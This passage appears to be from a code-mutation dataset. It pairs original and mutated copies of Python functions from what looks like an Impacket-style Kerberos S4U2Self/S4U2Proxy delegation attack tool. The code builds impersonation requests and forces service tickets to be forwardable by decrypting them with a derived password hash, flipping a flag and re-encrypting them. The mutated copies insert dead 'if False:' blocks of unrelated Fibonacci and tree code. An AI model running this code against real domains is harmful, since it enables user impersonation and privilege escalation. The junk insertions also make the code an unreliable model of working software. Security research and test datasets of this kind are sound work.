encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)"
        ]
    },
    {
        "func_name": "doS4U",
        "original": "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)",
        "mutated": [
            "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    if False:\n        i = 10\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        